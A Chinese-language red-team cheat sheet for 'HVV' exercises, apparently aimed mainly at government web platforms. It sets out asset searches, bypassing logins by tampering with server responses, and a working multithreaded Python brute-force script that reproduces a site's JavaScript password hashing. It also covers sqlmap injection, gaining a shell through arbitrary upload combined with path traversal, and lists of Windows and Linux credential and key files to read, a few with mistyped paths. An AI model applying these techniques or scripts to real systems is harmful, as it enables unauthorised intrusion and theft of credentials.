# HVV

---
- 资产搜索

  ```
  fofa、quanke
  title="xx" && (title="平台" || title="系统" || title="体系") &&title="xx"
  title="xx市" && (title="平台" || title="系统" || title="体系")&&title="xx"
  ```

  

- 弱口令登陆

  ```
  手动测试简单的弱口令账号密码
  登陆绕过：拦截响应包进行修改再放回内容:/右键/do intercept/Response to this request/ 
  	如：false变成true等，
  burp爆破，无加密
  burp爆破，简单的加密，如md5等，可以通过加载字典下面的/payload processing/hash md5
  burp爆破，可以通过js拿到加密函数,通过python读取下载回来的js加密函数的文件调用加密函数对爆破的密码进行加密，脚本demo如下：
  ```
  python  ：PyExecJS + selenium（可以改成chrome的驱动）
  ```
  import requests
  import threadpool
  from selenium import webdriver
  import execjs
  
  def getpass(str):
      with open ('md5.js','r') as js:
          source = js.read()
          phantom = execjs.get('PhantomJS')
          getpass = phantom.compile(source)
          password = getpass.call('hex_md5',str)
          return password
  
  def login(user,passwd):
      url="http://127.0.0.1/login.php"
      payload ={'username':user,'password':getpass(passwd)}
      headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'}
      try:        
          response = requests.post(url,data=payload,headers=headers,timeout=5)
          result=response.content
          if result.count('fail')<1: 
              print '[success] ' +url+":"+user+':'+passwd
  
      except:
          pass
          
  def getLines(fileName):
      list=[]
      with open(fileName, 'r') as fd:
          for line in fd.readlines():
              line = line.strip()
              if not len(line) or line.startswith('#'):
                  continue
              list.append(line)
      return list
  
  if __name__ == '__main__':    
      username_list=getLines('user.dict')
      password_list=getLines('pass.dict')
  
      userlist = [([user,passwd],None) for user in username_list for passwd in password_list]    
      
      pool = threadpool.ThreadPool(20)  
      reqs = threadpool.makeRequests(login,userlist)  
      [pool.putRequest(req) for req in reqs]  
      pool.wait()
  ```

- js信息泄露

  ```
  通过F12开发者工具/Sources/域名下的js文件/Pretty-print 进行美化代码进行读取
  看是否有其他功能接口地址，注释里面的标注框架，编辑器使用js等，甚至链接账号密码都有
  ```

- sql注入

  ```
  查询、注册、登陆、保存等功能地方可能会存在注入，gov多数使用oracle数据库
  推荐使用kali的sqlmap去跑
  ```

- xss注入

  ```
  一般在保存信息、评论等地方存在存储型xss
  ```

- 中间件漏洞

  ```
  gov多数使用tomcat、nginx、IIS等中间件，通过任意路径报错或者响应包header会有特征
  ```

- 框架模板漏洞

  ```
  通过样式、通标、特征等知道是什么模板框架，网上找是否有漏洞
  ```
  
- 任意上传漏洞

  ```
  能任意上传，但是不显示上传路径，可通过目录穿越上传+任意读取漏洞来getshell
  ```
  
- 任意读取漏洞

  ```
  通常会出现在下载功能的接口中
  比如app下载，如果是参数形式的下载apk路径，大概率存在任意读取
  通过../../去穿越目录读取其他文件
  比如多个../去到/,然后配合/root/.bash_history文件读取历史命令看网站路径
  ../../../web绝对路径/ ,最后配合任意上传，上传到网站根目录
  ```
  
  windows常见敏感文件路径
  
  ```
  C:\boot.ini //查看系统版本
  C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件
  C:\Windows\repair\sam //存储系统初次安装的密码
  C:\Program Files\mysql\my.ini //Mysql配置
  C:\Program Files\mysql\data\mysql\user.MYD //Mysql root
  C:\Windows\php.ini //php配置信息
  C:\Windows\my.ini //Mysql配置信息
  C:\Windows\win.ini //Windows系统的一个基本系统配置文件
  ```
  
  linux常见敏感文件路径：
  
  ```
  /root/.ssh/authorized_keys
  /root/.ssh/id_rsa
  /root/.ssh/id_ras.keystore
  /root/.ssh/known_hosts //记录每个访问计算机用户的公钥
  /etc/passwd
  /etc/shadow
  /etc/my.cnf //mysql配置文件
  /etc/httpd/conf/httpd.conf //apache配置文件
  /root/.bash_history //用户历史命令记录文件
  /root/.mysql_history //mysql历史命令记录文件
  /proc/mounts //记录系统挂载设备
  /porc/config.gz //内核配置文件
  /var/lib/mlocate/mlocate.db //全文件路径
  /porc/self/cmdline //当前进程的cmdline参数
  ```
  
  

